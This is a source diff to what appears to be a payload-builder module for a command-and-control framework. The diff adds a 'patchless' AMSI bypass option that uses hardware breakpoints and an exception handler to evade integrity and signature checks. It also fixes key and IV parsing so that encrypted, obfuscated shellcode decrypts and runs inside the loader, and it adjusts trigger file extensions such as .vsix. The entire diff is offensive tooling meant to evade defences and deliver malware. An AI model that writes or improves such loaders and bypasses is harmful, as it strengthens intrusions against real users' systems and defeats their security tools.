@@ -1241,9 +1241,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 "0 = Disabled (no patch)\n"
                 "1 = Patch AmsiScanBuffer only (default)\n"
                 "2 = + Patch AmsiOpenSession\n"
-                "3 = + InvalidateAmsiContext (heap-walk, aggressive)"
+                "3 = + InvalidateAmsiContext (heap-walk, aggressive)\n"
+                "4 = Patchless (Dr0 HW-BP + VEH, no byte patches; defeats "
+                "PG/CFG integrity scans and signature checks on amsi.dll)"
             ),
-            choices = ["0", "1", "2", "3"],
+            choices = ["0", "1", "2", "3", "4"],
             default_value = "1",
             required = False,
             hide_conditions = [
@@ -3868,7 +3870,7 @@ generated if none have been entered.""",
                 target_ext = _ext_map.get(_fmt, ".xlsm")
         else:
             _raw_trigger_ext = self.get_parameter('0.9 Trigger Type').lower()
-        target_ext = ".vsix" if _raw_trigger_ext == "vscode" else f".{_raw_trigger_ext}"
+            target_ext = ".vsix" if _raw_trigger_ext == "vscode" else f".{_raw_trigger_ext}"
 
 
         match(self.get_parameter("3.0 Container Type")):
@@ -4270,37 +4272,32 @@ generated if none have been entered.""",
                 output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
-                # Re-run shellcrypt in C format so we can parse the key/IV
-                # bytes out of its stdout and thread them into config.hpp.
-                # Command construction + regex parsing live in the
-                # shellcode_obfuscation plugin.
+                # Parse key/IV directly out of the C source shellcrypt
+                # just wrote in the first invocation above. The previous
+                # implementation re-ran shellcrypt to "extract" the key,
+                # but when the operator picks Encryption Key = "NONE"
+                # shellcrypt autogenerates a fresh random key per run -
+                # so the extracted key came from a SECOND keystream that
+                # didn't match the encrypted shellcode written on the
+                # first run. RC4/AES then decrypted to garbage at
+                # runtime and the loader never executed shellcode.
+                #
+                # ClickOnce uses -f csharp on call 1 so its file isn't
+                # parseable by the C-format regex; for that path we fall
+                # back to the existing CSharp key parser below (which
+                # reads the same call-1 file).
                 try:
-                    _comp2 = self.get_parameter("2.0 Compression Type")
-                    _enc2 = self.get_parameter("2.3 Encoding Type")
-                    key_cmd = build_key_extraction_cmd(
-                        shellcrypt_path,
-                        mythic_shellcode_path,
-                        encryption_method=ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
-                        compression_method=(COMPRESSION_METHODS[_comp2] if _comp2 and _comp2 != "NONE" else None),
-                        encoding_method=(ENCODING_METHODS[_enc2] if _enc2 and _enc2 != "NONE" else None),
-                        encryption_key=self.get_parameter("2.2 Encryption Key"),
-                    )
-                    _proc = await asyncio.create_subprocess_exec(
-                        *key_cmd,
-                        stdout=asyncio.subprocess.PIPE,
-                        stderr=asyncio.subprocess.PIPE,
-                    )
-                    _out, _err = await _proc.communicate()
-                    if _proc.returncode != 0:
-                        raise subprocess.CalledProcessError(_proc.returncode, key_cmd, _out, _err)
-                    shellcode_src = _out.decode()
-                    _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
-                    if _key_parsed is not None:
-                        encryption_key_bytes = _key_parsed
-                    if _iv_parsed is not None:
-                        encryption_iv_bytes = _iv_parsed
+                    _ldr = self.get_parameter("0.1 Loader Type")
+                    if _ldr != "ClickOnce":
+                        with open(obfuscated_shellcode_path, "r", encoding="utf-8", errors="replace") as _f:
+                            shellcode_src = _f.read()
+                        _key_parsed, _iv_parsed = parse_key_iv(shellcode_src)
+                        if _key_parsed is not None:
+                            encryption_key_bytes = _key_parsed
+                        if _iv_parsed is not None:
+                            encryption_iv_bytes = _iv_parsed
                 except Exception as e:
-                    output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"
+                    output += f"[WARN] Failed to parse shellcrypt key/IV from {obfuscated_shellcode_path}: {str(e)}\n"
 
                 # Copy the obfuscated shellcode file over to the shellcode.hpp file
                 if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
